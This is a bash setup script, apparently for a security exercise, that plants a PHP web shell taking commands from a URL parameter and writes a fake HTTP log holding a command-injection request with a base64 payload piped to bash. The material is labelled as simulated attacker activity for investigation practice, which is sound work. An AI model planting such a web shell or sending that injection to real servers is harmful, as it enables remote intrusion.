#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/config/sub_dir
    touch /home/user/config/database.conf
    touch /home/user/config/settings.ini

    # Simulate attacker actions
    chmod 777 /home/user/config/*
    echo "<?php system(\$_GET['cmd']); ?>" > /home/user/config/backdoor.php

    # Create log file
    cat << 'EOF' > /home/user/http_requests.log
192.168.1.50 | GET | /index.php?page=home
10.0.0.5 | POST | /login.php
192.168.1.105 | GET | /api/ping?host=127.0.0.1;echo%20Y2htb2QgNzc3IC9ob21lL3VzZXIvY29uZmlnLyo7IGVjaG8gIjw/cGhwIHN5c3RlbSgkeyNfR0VUWydjbWQnXX0pOyA/PiIgPiAvaG9tZS91c2VyL2NvbmZpZy9iYWNrZG9vci5waHA=%20|%20base64%20-d%20|%20bash
172.16.0.4 | GET | /images/logo.png
EOF

    chmod -R 777 /home/user
